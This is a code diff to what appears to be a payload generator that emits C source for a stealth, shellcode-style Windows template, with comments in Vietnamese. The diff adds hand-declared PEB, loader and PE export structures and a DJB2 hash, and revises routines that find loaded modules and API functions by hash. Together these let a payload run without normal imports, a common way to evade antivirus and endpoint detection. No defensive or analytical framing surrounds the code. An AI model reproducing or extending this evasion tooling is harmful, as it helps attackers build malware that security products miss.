@@ -603,11 +603,9 @@ static void _poc_popup(const char* msg){{
         return path
 
     def _get_ghost_protocol_v4_header(self):
-        """Tier-4: Siêu cấp tàng hình (CRT-Free, No windows.h, Pure Shellcode style)"""
+        """Tier-4: Siêu cấp tàng hình (CRT-Free, Zero-Include, Pure Shellcode style)"""
         return """
-#include <winternl.h>
-
-// Định nghĩa cơ bản để không cần windows.h
+// [APS-SILENCE] Zero-Include Header
 typedef void* PVOID;
 typedef unsigned long long QWORD;
 typedef unsigned long DWORD;
@@ -615,19 +613,129 @@ typedef unsigned short WORD;
 typedef unsigned char BYTE;
 typedef long long INT64;
 typedef void* HANDLE;
-typedef HANDLE HINSTANCE;
-typedef HINSTANCE HMODULE;
 typedef void* HWND;
 typedef unsigned int UINT;
 typedef const char* LPCSTR;
 typedef void* LPVOID;
-typedef DWORD (WINAPI *PTHREAD_START_ROUTINE)(LPVOID);
-typedef PVOID LPSECURITY_ATTRIBUTES;
-typedef DWORD* LPDWORD;
+typedef void* HMODULE;
+typedef void* HINSTANCE;
+typedef void* FARPROC;
 
 #define WINAPI __stdcall
 #define NULL ((void*)0)
 #define DLL_PROCESS_ATTACH 1
+
+// Thủ công cấu trúc PEB/LDR (Không cần winternl.h)
+typedef struct _UNICODE_STRING {
+    WORD Length;
+    WORD MaximumLength;
+    WORD* Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _LDR_DATA_TABLE_ENTRY {
+    struct _LIST_ENTRY InMemoryOrderLinks;
+    struct _LIST_ENTRY InInitializationOrderLinks;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    DWORD SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+
+typedef struct _PEB_LDR_DATA {
+    DWORD Length;
+    BYTE Initialized;
+    PVOID SsHandle;
+    struct _LIST_ENTRY InLoadOrderModuleList;
+    struct _LIST_ENTRY InMemoryOrderModuleList;
+} PEB_LDR_DATA, *PPEB_LDR_DATA;
+
+typedef struct _PEB {
+    BYTE Reserved1[2];
+    BYTE BeingDebugged;
+    BYTE Reserved2[21];
+    PPEB_LDR_DATA Ldr;
+} PEB, *PPEB;
+
+typedef struct _IMAGE_DOS_HEADER {
+    WORD e_magic;
+    WORD e_cblp;
+    WORD e_cp;
+    WORD e_crlc;
+    WORD e_cparhdr;
+    WORD e_minalloc;
+    WORD e_maxalloc;
+    WORD e_ss;
+    WORD e_sp;
+    WORD e_csum;
+    WORD e_ip;
+    WORD e_cs;
+    WORD e_lfarlc;
+    WORD e_ovno;
+    WORD e_res[4];
+    WORD e_oemid;
+    WORD e_oeminfo;
+    WORD e_res2[10];
+    long e_lfanew;
+} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
+
+typedef struct _IMAGE_DATA_DIRECTORY {
+    DWORD VirtualAddress;
+    DWORD Size;
+} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
+
+typedef struct _IMAGE_OPTIONAL_HEADER64 {
+    WORD Magic;
+    BYTE MajorLinkerVersion;
+    BYTE MinorLinkerVersion;
+    DWORD SizeOfCode;
+    DWORD SizeOfInitializedData;
+    DWORD SizeOfUninitializedData;
+    DWORD AddressOfEntryPoint;
+    DWORD BaseOfCode;
+    QWORD ImageBase;
+    DWORD SectionAlignment;
+    DWORD FileAlignment;
+    WORD MajorOperatingSystemVersion;
+    WORD MinorOperatingSystemVersion;
+    WORD MajorImageVersion;
+    WORD MinorImageVersion;
+    WORD MajorSubsystemVersion;
+    WORD MinorSubsystemVersion;
+    DWORD Win32VersionValue;
+    DWORD SizeOfImage;
+    DWORD SizeOfHeaders;
+    DWORD CheckSum;
+    WORD Subsystem;
+    WORD DllCharacteristics;
+    QWORD SizeOfStackReserve;
+    QWORD SizeOfStackCommit;
+    QWORD SizeOfHeapReserve;
+    QWORD SizeOfHeapCommit;
+    DWORD LoaderFlags;
+    DWORD NumberOfRvaAndSizes;
+    IMAGE_DATA_DIRECTORY DataDirectory[16];
+} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;
+
+typedef struct _IMAGE_NT_HEADERS64 {
+    DWORD Signature;
+    BYTE FileHeader[20];
+    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
+} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;
+
+typedef struct _IMAGE_EXPORT_DIRECTORY {
+    DWORD Characteristics;
+    DWORD TimeDateStamp;
+    WORD MajorVersion;
+    WORD MinorVersion;
+    DWORD Name;
+    DWORD Base;
+    DWORD NumberOfFunctions;
+    DWORD NumberOfNames;
+    DWORD AddressOfFunctions;
+    DWORD AddressOfNames;
+    DWORD AddressOfNameOrdinals;
+} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
 
 // Thuật toán băm DJB2
 unsigned long Hash(const char* str) {
@@ -663,8 +771,8 @@ HMODULE GetModH(unsigned long hash) {
 FARPROC GetProcH(HMODULE h, unsigned long hash) {
     if (!h) return NULL;
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
-    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)h + dos->e_lfanew);
-    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)h + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((BYTE*)h + dos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)h + nt->OptionalHeader.DataDirectory[0].VirtualAddress);
     DWORD* names = (DWORD*)((BYTE*)h + exp->AddressOfNames);
     WORD* ords = (WORD*)((BYTE*)h + exp->AddressOfNameOrdinals);
     DWORD* funcs = (DWORD*)((BYTE*)h + exp->AddressOfFunctions);
